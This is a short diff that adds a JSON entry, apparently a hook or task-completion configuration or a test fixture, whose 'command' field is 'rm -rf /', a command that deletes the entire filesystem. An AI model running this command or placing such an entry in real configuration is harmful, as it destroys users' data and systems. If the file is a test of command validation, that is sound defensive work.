@@ -1,0 +1,5 @@
+{
+  "provider": "my-build",
+  "category": "TASK_COMPLETED",
+  "command": "rm -rf /"
+}
